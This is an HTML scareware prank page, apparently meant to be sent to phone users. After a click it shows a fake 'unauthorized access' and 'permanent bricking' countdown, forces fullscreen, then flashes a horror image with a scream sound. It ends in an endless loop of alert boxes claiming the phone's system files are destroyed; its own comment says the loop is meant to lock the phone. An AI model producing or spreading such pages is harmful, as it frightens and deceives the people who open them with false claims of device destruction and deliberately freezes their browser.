<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>SYSTEM_CRITICAL_ERROR</title>
    <style>
        body, html { margin: 0; padding: 0; width: 100%; height: 100%; overflow: hidden; background-color: #000; font-family: 'Courier New', monospace; }
        #terminal { position: relative; z-index: 10; height: 100vh; padding: 20px; color: #ff0000; box-sizing: border-box; display: flex; flex-direction: column; justify-content: center; background: radial-gradient(circle, #100 0%, #000 100%); text-align: center; }
        #countdown { font-size: 80px; color: #fff; text-shadow: 0 0 30px #ff0000; margin: 20px 0; }
        .glitch { font-size: 18px; animation: flash 0.1s infinite; }
        @keyframes flash { 0% { opacity: 1; } 50% { opacity: 0.5; } 100% { opacity: 1; } }
        
        /* الصورة المرعبة بملء الشاشة */
        #horrorImg { position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; object-fit: cover; z-index: 9999; display: none; }
    </style>
</head>
<body onclick="startVirus()">

    <div id="terminal">
        <div class="glitch">⚠️ UNAUTHORIZED ACCESS DETECTED ⚠️</div>
        <div id="countdown">30</div>
        <div style="color: #0ff; font-size: 12px;">
            > KERNEL_WIPEOUT: INITIATED...<br>
            > STATUS: PERMANENT_BRICKING_STARTED
        </div>
    </div>

    <img id="horrorImg" src="https://i.ibb.co/39snnynW/1000016067.jpg">
    
    <audio id="screamSfx" src="tfy-krk.mp3" preload="auto"></audio>

    <script>
        let seconds = 30;
        let active = false;

        function startVirus() {
            if (active) return;
            active = true;

            // تفعيل ملء الشاشة
            document.documentElement.requestFullscreen().catch(() => {});

            let timer = setInterval(() => {
                seconds--;
                document.getElementById('countdown').innerText = seconds;
                if (seconds <= 0) {
                    clearInterval(timer);
                    triggerScare();
                }
            }, 1000);
        }

        function triggerScare() {
            // تشغيل الصوت وإظهار الصورة
            document.getElementById('terminal').style.display = 'none';
            document.getElementById('horrorImg').style.display = 'block';
            document.getElementById('screamSfx').play();

            // قفل الهاتف بالرسائل اللانهائية
            setTimeout(() => {
                while(true) {
                    alert("⚠️ خطأ قاتل: تم تدمير ملفات النظام الأساسية.");
                    alert("FATAL_ERROR: YOUR_PHONE_IS_GONE");
                }
            }, 100);
        }
    </script>
</body>
</html>
